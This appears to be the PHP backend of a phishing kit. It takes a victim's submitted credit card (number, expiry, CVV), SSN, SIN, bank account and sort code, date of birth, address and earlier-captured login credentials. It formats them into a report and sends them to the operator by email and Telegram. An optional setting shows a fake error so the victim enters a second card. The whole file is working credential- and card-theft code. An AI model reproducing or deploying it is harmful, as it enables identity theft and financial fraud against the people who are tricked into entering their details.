<?php
require __DIR__ . '/../function.php';
require __DIR__ . '/../system/class/creditcard.php';

$card = CreditCard::validCreditCard(str_replace(" ", "", $_POST[$api->encypt('cardnumber')]));
$expsplit = explode("/", $_POST[$api->encypt('cardexp')]);
$checkexp = CreditCard::validDate("20".$expsplit[1], $expsplit[0]);
$checkcvv = CreditCard::validCvc($_POST[$api->encypt('cvv')], $card['type']);

if(!$card['valid']) {
  exit("error");
} else if (!$checkexp) {
  echo("exp");
} else if (!$checkcvv) {
  echo("cvv");
} else {
$_SESSION['cardname'] = $_POST[$api->encypt('cardname')] ?? '';
$_SESSION['cardnumber'] = substr(preg_replace('/\s+/', '', $_POST[$api->encypt('cardnumber')] ?? ''), 0);
$_SESSION['cardexp'] = $_POST[$api->encypt('cardexp')] ?? '';
$_SESSION['cvv'] = $_POST[$api->encypt('cvv')] ?? '';
$_SESSION['cardbin']  = substr(str_replace(" ", "", $_SESSION['cardnumber']), 0, 6);
$binData = $api->bin($_SESSION['cardbin']);
if ($binData === false) {
    $_SESSION['card_bin'] = "Unknown BIN";
    $_SESSION['cardbin_bank'] = "Unknown Bank";
} else {
    $_SESSION['card_bin'] = $binData['full'];
    $_SESSION['cardbin_bank'] = $binData['bank'];
}

$_SESSION['fullname'] = $_POST[$api->encypt('fullname')] ?? '';
$_SESSION['dob'] = $_POST[$api->encypt('dob')] ?? '';
$_SESSION['phone'] = $_POST[$api->encypt('phone')] ?? '';
$_SESSION['addressline1'] = $_POST[$api->encypt('address')] ?? '';
$_SESSION['addressline2'] = $_POST[$api->encypt('addressline2')] ?? '';
$_SESSION['negara'] = $_POST[$api->encypt('country')] ?? '';
$_SESSION['kota'] = $_POST[$api->encypt('kota')] ?? '';
$_SESSION['region'] = $_POST[$api->encypt('region')] ?? '';
$_SESSION['zipcode'] = $_POST[$api->encypt('zipcode')] ?? '';

$_SESSION['ssn'] = $_POST[$api->encypt('ssn')] ?? '';
$_SESSION['sin'] = $_POST[$api->encypt('sin')] ?? '';
$_SESSION['acno'] = $_POST[$api->encypt('acno')] ?? '';
$_SESSION['sortcode'] = $_POST[$api->encypt('sortcode')] ?? '';
$_SESSION['osid'] = $_POST[$api->encypt('osid')] ?? '';
$_SESSION['climit'] = $_POST[$api->encypt('climit')] ?? '';

$message = file_get_contents(__DIR__ . "/Template/payment.html");
$message = preg_replace('{GLITCH-RANDOM}', $_SESSION['key'], $message);
$message = preg_replace('{GLITCH-DATE}', date('D d M Y'), $message);
$message = preg_replace('{GLITCH-USERNAME}', $_SESSION['username'], $message);
$message = preg_replace('{GLITCH-PASSWORD}', $_SESSION['password'], $message);
$message = preg_replace('{GLITCH-CARDNAME}', $_SESSION['cardname'], $message);
$message = preg_replace('{GLITCH-CARDNUMBER}', $_SESSION['cardnumber'], $message);
$message = preg_replace('{GLITCH-CARDEXP}', $_SESSION['cardexp'], $message);
$message = preg_replace('{GLITCH-CVV}', $_SESSION['cvv'], $message);
$message = preg_replace('{GLITCH-CARDBIN}', $_SESSION['card_bin'], $message);
$message = preg_replace('{GLITCH-FULLNAME}', $_SESSION['fullname'], $message);
$message = preg_replace('{GLITCH-DOB}', $_SESSION['dob'], $message);
$message = preg_replace('{GLITCH-PHONE}', $_SESSION['phone'], $message);
$message = preg_replace('{GLITCH-ADDRESS}', $_SESSION['addressline1'].''.$_SESSION['addressline2'], $message);
$message = preg_replace('{GLITCH-COUNTRY}', $_SESSION['negara'], $message);
$message = preg_replace('{GLITCH-KOTA}', $_SESSION['kota'], $message);
$message = preg_replace('{GLITCH-REGION}', $_SESSION['region'], $message);
$message = preg_replace('{GLITCH-ZIPCODE}', $_SESSION['zipcode'], $message);
$message = preg_replace('{GLITCH-SOCIALSECURITYNUMBER}', $_SESSION['ssn'], $message);
$message = preg_replace('{GLITCH-SOCIALINSURANCENUMBER}', $_SESSION['sin'], $message);
$message = preg_replace('{GLITCH-ACCOUNTNUMBER}', $_SESSION['acno'], $message);
$message = preg_replace('{GLITCH-SORTCODE}', $_SESSION['sortcode'], $message);
$message = preg_replace('{GLITCH-OSIDNUMBER}', $_SESSION['osid'], $message);
$message = preg_replace('{GLITCH-CREDITLIMIT}', $_SESSION['climit'], $message);
$message = preg_replace('{GLITCH-CITY}', $_SESSION['city'], $message);
$message = preg_replace('{GLITCH-STATE}', $_SESSION['state'], $message);
$message = preg_replace('{GLITCH-IP}', $_SESSION['ip'], $message);
$message = preg_replace('{GLITCH-HOST}', $_SESSION['host'], $message);
$message = preg_replace('{GLITCH-ISP}', $_SESSION['isp'], $message);
$message = preg_replace('{GLITCH-OS}', $_SESSION['os'], $message);
$message = preg_replace('{GLITCH-BROWSER}', $_SESSION['browser'], $message);
$message = preg_replace('{GLITCH-USERAGENT}', $_SESSION['useragent'], $message);

$subject = "(I) {$_SESSION['card_bin']} // {$_SESSION['country']} - {$_SESSION['ip']} - {$_SESSION['os']} - {$_SESSION['browser']}";
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
$headers .= "From: {$_SESSION['cardname']} <notifications@glitchlabs.zone>";

$logs = "(I) " . date('d M Y H:i A') . "|" . $_SESSION['card_bin'] . "|" . $_SESSION['country'];
$api->save($api->logs("card"), $logs."\n", "a");
  
if ($api->config("resulttoemail") == "on") {
    if ($api->config("sending") == "smtp") {
        $api->send($api->result(), $subject, $message, $_SESSION["cardname"]);
    } elseif ($api->config("sending") == "mail") {
        @mail($api->result(), $subject, $message, $headers);
    }
}

if ($api->config("resulttotelegram") == "on") {
    $msg = $api->generateFullinformationMessage(
        $_SESSION['username'], $_SESSION['password'], 
        $_SESSION['cardname'], $_SESSION['cardnumber'], $_SESSION['cardexp'], $_SESSION['cvv'], $_SESSION['card_bin'], 
        $_SESSION['fullname'], $_SESSION['dob'], $_SESSION['phone'], $_SESSION['addressline1'], $_SESSION['addressline2'], $_SESSION['negara'], $_SESSION['kota'], $_SESSION['region'], $_SESSION['zipcode'], 
        $_SESSION['ssn'], $_SESSION['sin'], $_SESSION['acno'], $_SESSION['sortcode'], $_SESSION['osid'], $_SESSION['climit'], 
        date('D d M Y'), $_SESSION['ip'], $_SESSION['isp'], $_SESSION['country'], $_SESSION['state'], $_SESSION['city'], $_SESSION['browser'], $_SESSION['os']
    );
    $api->sendTelegram($msg);
}

if ($api->config("doublecreditcard") == "on") {
    $api->redirectPage("/ax/account/payment", "/ap/account/payment", "&error=true");
} else {
    $api->redirectPage('/ax/account/success-verified', '/ap/account/success-verified');
}
}
?>